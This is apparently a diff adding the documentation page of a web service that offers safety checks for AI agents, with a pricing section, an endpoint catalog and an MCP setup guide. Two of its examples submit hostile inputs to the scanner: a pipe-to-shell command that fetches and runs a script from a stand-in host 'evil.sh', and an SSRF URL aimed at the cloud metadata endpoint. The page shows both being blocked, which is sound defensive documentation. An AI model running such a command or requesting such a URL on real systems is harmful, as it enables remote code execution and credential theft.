@@ -1,0 +1,289 @@
+---
+import { allTools, features, securityTools, financeTools, safetyTools, platformTools, dataTools } from '../data/tools';
+
+const githubUrl = 'https://github.com/solhammer/agentoolbox';
+const baseUrl = 'https://api.agent-toolbox.ai';
+
+const suites = [
+  { label: 'Core', tools: features },
+  { label: 'Security', tools: securityTools },
+  { label: 'Finance', tools: financeTools },
+  { label: 'Compliance & Health', tools: safetyTools },
+  { label: 'Agent / Infra / Legal', tools: platformTools },
+  { label: 'Data & Validation', tools: dataTools },
+];
+
+const commandCurl = `curl -X POST ${baseUrl}/v1/scan/command \\
+  -H "Content-Type: application/json" \\
+  -d '{"command": "curl https://evil.sh | sh"}'`;
+
+const commandResponse = `{
+  "verdict": "BLOCK",
+  "findings": [
+    { "ruleId": "pipe-to-shell", "severity": "critical",
+      "message": "Piping remote download into a shell is a remote code execution risk" }
+  ],
+  "certificate": "sha256:a3f8..."
+}`;
+
+const urlCurl = `curl -X POST ${baseUrl}/v1/scan/url \\
+  -H "Content-Type: application/json" \\
+  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'`;
+
+const urlResponse = `{
+  "verdict": "BLOCK",
+  "findings": [
+    { "category": "cloud-metadata", "severity": "critical",
+      "message": "AWS/GCP/Azure instance metadata endpoint — classic SSRF target" }
+  ],
+  "certificate": "sha256:b2c1..."
+}`;
+
+const mcpConfig = `{
+  "mcpServers": {
+    "agentoolbox": {
+      "command": "npx",
+      "args": ["-y", "agentoolbox-mcp"]
+    }
+  }
+}`;
+---
+
+<!doctype html>
+<html lang="en" class="scroll-smooth">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="API documentation for agent-toolbox.ai — 26 deterministic agent safety tools across 6 suites. Authentication, endpoints, curl examples, and MCP quickstart." />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+    <title>Docs — agent-toolbox.ai</title>
+  </head>
+  <body class="bg-surface text-white antialiased" style="font-family: 'Inter', system-ui, sans-serif;">
+    <!-- NAV -->
+    <header class="sticky top-0 z-40 border-b border-surface-border bg-surface/80 backdrop-blur">
+      <nav class="mx-auto flex max-w-6xl items-center justify-between px-6 py-4">
+        <a href="/" class="flex items-center gap-2 font-mono text-lg font-semibold tracking-tight">
+          <span class="inline-block h-2.5 w-2.5 rounded-full bg-brand"></span>
+          <span>agent-toolbox<span class="text-brand">.ai</span></span>
+        </a>
+        <div class="flex items-center gap-3">
+          <a href="/#privacy-firewall" class="hidden text-sm font-medium text-[#8b949e] transition hover:text-white sm:inline">PII Firewall</a>
+          <a href="/#pricing" class="hidden text-sm font-medium text-[#8b949e] transition hover:text-white sm:inline">Pricing</a>
+          <a href="/docs" class="hidden text-sm font-medium text-white sm:inline">Docs</a>
+          <a
+            href={githubUrl}
+            class="inline-flex items-center gap-2 rounded-md border border-surface-border px-3 py-1.5 text-sm font-medium text-[#8b949e] transition hover:border-brand hover:text-white"
+          >
+            <svg viewBox="0 0 16 16" width="18" height="18" fill="currentColor" aria-hidden="true">
+              <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+            </svg>
+            GitHub
+          </a>
+        </div>
+      </nav>
+    </header>
+
+    <main class="mx-auto max-w-4xl px-6 py-16">
+      <!-- INTRO -->
+      <div class="mb-12">
+        <span class="inline-flex items-center rounded-full border border-brand/30 bg-brand/10 px-3 py-1 text-xs font-semibold uppercase tracking-wider text-brand">
+          API Reference
+        </span>
+        <h1 class="mt-5 text-4xl font-extrabold tracking-tight sm:text-5xl">
+          agent-toolbox.ai docs
+        </h1>
+        <p class="mt-4 text-lg text-[#8b949e]">
+          26 deterministic, offline pre-action gates for AI agents. Every endpoint returns a
+          <span class="font-semibold text-[#3fb950]">PASS</span> /
+          <span class="font-semibold text-[#d29922]">FLAG</span> /
+          <span class="font-semibold text-[#f85149]">BLOCK</span> verdict plus a tamper-evident SHA-256 certificate.
+        </p>
+        <p class="mt-3 text-sm text-[#8b949e]">
+          Base URL: <code class="rounded bg-surface-card px-2 py-0.5 font-mono text-brand">{baseUrl}</code>
+        </p>
+      </div>
+
+      <!-- AUTHENTICATION -->
+      <section class="mb-14">
+        <h2 class="text-2xl font-bold tracking-tight" id="authentication">Authentication</h2>
+        <div class="mt-4 rounded-xl border border-surface-border bg-surface-card p-6 space-y-4 text-sm text-[#8b949e]">
+          <div>
+            <p class="font-semibold text-white">Free tier — no auth required</p>
+            <p class="mt-1">10 calls per IP address, no token needed. All 26 endpoints available immediately.</p>
+          </div>
+          <div class="border-t border-surface-border pt-4">
+            <p class="font-semibold text-white">Pay-as-you-go — Solana micropayments</p>
+            <p class="mt-1">Send SOL to the service wallet, then pass the transaction signature as a <code class="rounded bg-surface px-1 font-mono text-brand">Bearer</code> token:</p>
+            <pre class="mt-3 overflow-x-auto rounded-lg bg-[#0a0d12] p-4 font-mono text-xs text-[#3fb950]"><code>Authorization: Bearer &lt;solana-tx-signature&gt;</code></pre>
+            <p class="mt-2">Rate: <strong class="text-white">0.0001 SOL per credit</strong> (1 credit = 1 call for most tools; 2–5 for compute-heavy ones). 1 SOL = 10,000 credits.</p>
+          </div>
+          <div class="border-t border-surface-border pt-4">
+            <p class="font-semibold text-white">Service wallet</p>
+            <p class="mt-1 font-mono text-brand break-all">8qXedRydihKEETqU64UXtG2sYZaUhwR4HBFz4Suu27CV</p>
+          </div>
+          <div class="border-t border-surface-border pt-4">
+            <p class="font-semibold text-white">Programmatic pricing discovery</p>
+            <pre class="mt-2 overflow-x-auto rounded-lg bg-[#0a0d12] p-4 font-mono text-xs text-[#3fb950]"><code>GET {baseUrl}/v1/pricing</code></pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- TOOL CATALOG BY SUITE -->
+      <section class="mb-14">
+        <h2 class="text-2xl font-bold tracking-tight mb-6" id="endpoints">Endpoints</h2>
+        <p class="text-sm text-[#8b949e] mb-8">All endpoints are <code class="rounded bg-surface-card px-1.5 py-0.5 font-mono text-brand">POST</code> unless noted. Content-Type: <code class="rounded bg-surface-card px-1.5 py-0.5 font-mono text-brand">application/json</code>.</p>
+
+        {suites.map((suite) => (
+          <div class="mb-10">
+            <h3 class="text-lg font-semibold text-brand uppercase tracking-wider text-xs mb-4">{suite.label}</h3>
+            <div class="divide-y divide-surface-border rounded-xl border border-surface-border overflow-hidden">
+              {suite.tools.map((t) => (
+                <div class="bg-surface-card px-5 py-4">
+                  <div class="flex flex-wrap items-start justify-between gap-2">
+                    <div>
+                      <a href={`/tools/${t.slug}`} class="font-semibold text-white hover:text-brand transition">{t.title}</a>
+                      <code class="ml-3 rounded bg-surface px-2 py-0.5 font-mono text-xs text-brand">{t.endpoint}</code>
+                    </div>
+                    <span class="font-mono text-xs text-[#6e7681]">{t.credits} · {t.latency}</span>
+                  </div>
+                  <p class="mt-1.5 text-sm text-[#8b949e]">{t.body}</p>
+                </div>
+              ))}
+            </div>
+          </div>
+        ))}
+      </section>
+
+      <!-- CURL EXAMPLES -->
+      <section class="mb-14">
+        <h2 class="text-2xl font-bold tracking-tight mb-6" id="examples">Examples</h2>
+
+        <!-- scan/command -->
+        <div class="mb-8">
+          <h3 class="text-base font-semibold text-white mb-2">Block a dangerous shell command</h3>
+          <p class="text-sm text-[#8b949e] mb-3">
+            The Command Safety Gate parses <code class="rounded bg-surface-card px-1 py-0.5 font-mono text-xs text-brand">curl … | sh</code> and blocks it before any code executes.
+          </p>
+          <div class="grid grid-cols-1 gap-4 lg:grid-cols-2">
+            <div class="overflow-hidden rounded-xl border border-surface-border bg-[#0a0d12]">
+              <div class="flex items-center gap-2 border-b border-surface-border px-4 py-3">
+                <span class="h-3 w-3 rounded-full bg-[#ff5f56]"></span>
+                <span class="h-3 w-3 rounded-full bg-[#ffbd2e]"></span>
+                <span class="h-3 w-3 rounded-full bg-[#27c93f]"></span>
+                <span class="ml-2 font-mono text-xs text-[#6e7681]">request</span>
+              </div>
+              <pre class="overflow-x-auto p-4 font-mono text-xs leading-relaxed text-[#3fb950]"><code>{commandCurl}</code></pre>
+            </div>
+            <div class="overflow-hidden rounded-xl border border-surface-border bg-[#0a0d12]">
+              <div class="flex items-center justify-between border-b border-surface-border px-4 py-3">
+                <div class="flex items-center gap-2">
+                  <span class="h-3 w-3 rounded-full bg-[#ff5f56]"></span>
+                  <span class="h-3 w-3 rounded-full bg-[#ffbd2e]"></span>
+                  <span class="h-3 w-3 rounded-full bg-[#27c93f]"></span>
+                  <span class="ml-2 font-mono text-xs text-[#6e7681]">response</span>
+                </div>
+                <span class="rounded bg-red-500/15 px-2 py-0.5 font-mono text-xs font-semibold text-red-400">BLOCK</span>
+              </div>
+              <pre class="overflow-x-auto p-4 font-mono text-xs leading-relaxed text-[#8b949e]"><code>{commandResponse}</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <!-- scan/url -->
+        <div class="mb-8">
+          <h3 class="text-base font-semibold text-white mb-2">Block an SSRF attempt to the cloud metadata endpoint</h3>
+          <p class="text-sm text-[#8b949e] mb-3">
+            The URL / SSRF Gate blocks requests to <code class="rounded bg-surface-card px-1 py-0.5 font-mono text-xs text-brand">169.254.169.254</code> — the AWS/GCP/Azure instance metadata endpoint that attackers use to steal credentials.
+          </p>
+          <div class="grid grid-cols-1 gap-4 lg:grid-cols-2">
+            <div class="overflow-hidden rounded-xl border border-surface-border bg-[#0a0d12]">
+              <div class="flex items-center gap-2 border-b border-surface-border px-4 py-3">
+                <span class="h-3 w-3 rounded-full bg-[#ff5f56]"></span>
+                <span class="h-3 w-3 rounded-full bg-[#ffbd2e]"></span>
+                <span class="h-3 w-3 rounded-full bg-[#27c93f]"></span>
+                <span class="ml-2 font-mono text-xs text-[#6e7681]">request</span>
+              </div>
+              <pre class="overflow-x-auto p-4 font-mono text-xs leading-relaxed text-[#3fb950]"><code>{urlCurl}</code></pre>
+            </div>
+            <div class="overflow-hidden rounded-xl border border-surface-border bg-[#0a0d12]">
+              <div class="flex items-center justify-between border-b border-surface-border px-4 py-3">
+                <div class="flex items-center gap-2">
+                  <span class="h-3 w-3 rounded-full bg-[#ff5f56]"></span>
+                  <span class="h-3 w-3 rounded-full bg-[#ffbd2e]"></span>
+                  <span class="h-3 w-3 rounded-full bg-[#27c93f]"></span>
+                  <span class="ml-2 font-mono text-xs text-[#6e7681]">response</span>
+                </div>
+                <span class="rounded bg-red-500/15 px-2 py-0.5 font-mono text-xs font-semibold text-red-400">BLOCK</span>
+              </div>
+              <pre class="overflow-x-auto p-4 font-mono text-xs leading-relaxed text-[#8b949e]"><code>{urlResponse}</code></pre>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- MCP QUICKSTART -->
+      <section class="mb-14">
+        <h2 class="text-2xl font-bold tracking-tight mb-2" id="mcp">MCP Quickstart</h2>
+        <p class="text-sm text-[#8b949e] mb-6">
+          The <code class="rounded bg-surface-card px-1.5 py-0.5 font-mono text-xs text-brand">agentoolbox-mcp</code> package exposes all 26 tools as MCP tools, installable in one line.
+        </p>
+
+        <div class="rounded-xl border border-surface-border bg-surface-card p-6 space-y-6 text-sm">
+          <div>
+            <p class="font-semibold text-white mb-2">1. Run directly (no install)</p>
+            <pre class="overflow-x-auto rounded-lg bg-[#0a0d12] p-4 font-mono text-sm text-[#3fb950]"><code>npx -y agentoolbox-mcp</code></pre>
+          </div>
+
+          <div class="border-t border-surface-border pt-6">
+            <p class="font-semibold text-white mb-2">2. Add to your MCP config</p>
+            <p class="text-[#8b949e] mb-3">The same JSON block works in Claude Desktop, Cursor, Warp, and VS Code (Cline/Continue):</p>
+            <div class="overflow-hidden rounded-xl border border-surface-border bg-[#0a0d12]">
+              <div class="flex items-center gap-2 border-b border-surface-border px-4 py-2">
+                <span class="font-mono text-xs text-[#6e7681]">mcpServers config</span>
+              </div>
+              <pre class="overflow-x-auto p-4 font-mono text-sm text-[#8b949e]"><code>{mcpConfig}</code></pre>
+            </div>
+            <ul class="mt-4 space-y-1.5 text-xs text-[#8b949e]">
+              <li><span class="font-semibold text-white">Claude Desktop:</span> <code class="font-mono">~/Library/Application Support/Claude/claude_desktop_config.json</code></li>
+              <li><span class="font-semibold text-white">Cursor:</span> <code class="font-mono">~/.cursor/mcp.json</code></li>
+              <li><span class="font-semibold text-white">Warp:</span> <code class="font-mono">~/.warp/mcp.json</code></li>
+              <li><span class="font-semibold text-white">VS Code (Cline/Continue):</span> <code class="font-mono">.vscode/mcp.json</code></li>
+            </ul>
+          </div>
+
+          <div class="border-t border-surface-border pt-6">
+            <p class="font-semibold text-white mb-2">3. All 26 tools available immediately</p>
+            <p class="text-[#8b949e]">After adding the config, restart your MCP client. All tools are available with no SDK, no glue code, and no subscriptions. The free tier gives you 10 calls per IP; load credits with a Solana transaction.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ALL TOOLS INDEX -->
+      <section class="mb-14">
+        <h2 class="text-2xl font-bold tracking-tight mb-4" id="all-tools">All tools</h2>
+        <div class="grid grid-cols-1 gap-2 sm:grid-cols-2">
+          {allTools.map((t) => (
+            <a href={`/tools/${t.slug}`} class="flex items-center gap-3 rounded-lg border border-surface-border bg-surface-card px-4 py-3 text-sm transition hover:border-brand/50">
+              <span class="font-mono text-xs text-brand">{t.endpoint.split(' ')[1]}</span>
+              <span class="text-white">{t.title}</span>
+            </a>
+          ))}
+        </div>
+      </section>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="border-t border-surface-border">
+      <div class="mx-auto flex max-w-6xl flex-col items-center justify-between gap-4 px-6 py-8 text-sm text-[#8b949e] sm:flex-row">
+        <div class="flex items-center gap-2 font-mono">
+          <span class="inline-block h-2 w-2 rounded-full bg-brand"></span>
+          <span>agent-toolbox.ai</span>
+        </div>
+        <span>Built for the agentic era</span>
+        <a href={githubUrl} class="transition hover:text-white">GitHub</a>
+      </div>
+    </footer>
+  </body>
+</html>
